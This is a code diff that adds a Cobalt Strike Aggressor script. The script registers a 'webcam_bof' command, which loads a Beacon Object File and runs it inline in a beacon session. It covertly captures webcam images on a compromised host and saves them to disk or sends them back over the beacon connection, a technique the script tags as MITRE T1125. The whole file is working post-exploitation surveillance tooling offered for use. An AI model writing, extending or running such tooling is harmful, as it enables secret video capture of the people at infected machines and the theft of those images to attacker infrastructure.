@@ -1,0 +1,31 @@
+
+#Register command
+beacon_command_register(
+    "webcam_bof",
+    "Webcam capability for Cobalt Strike",
+    "Use: webcam_bof [filename] [save method]\nSave methods:\n\t0: drop file to disk\n\t1: download over beacon as a file\n\t2: download over beacon\n\nTake a Webcam inline using a BOF. Image is saved as JPEG on disk or downloaded over beacon."
+);
+
+alias webcam_bof {
+    local('$bid $barch $handle $data $args $target_pid');
+    $bid = $1;
+    # figure out the arch of this session
+    $barch  = barch($bid);
+    if (size(@_) != 3)
+    {
+        berror($1, "Syntax: webcam_bof [filename] [save method 0/1/2] e.g. webcam_bof file.jpeg 2");
+                return;
+    }
+    # read in the right BOF file
+    $handle = openf(script_resource("WebcamBOF. $+ $barch $+ .obj"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+
+    $args   = bof_pack($bid, "zi", $2, $3);
+
+    # announce what we're doing
+    btask($bid, "Running Webcam BOF by (@codex_tf2)", "T1125");
+    # execute it.
+    beacon_inline_execute($bid, $data, "go", $args);
+}
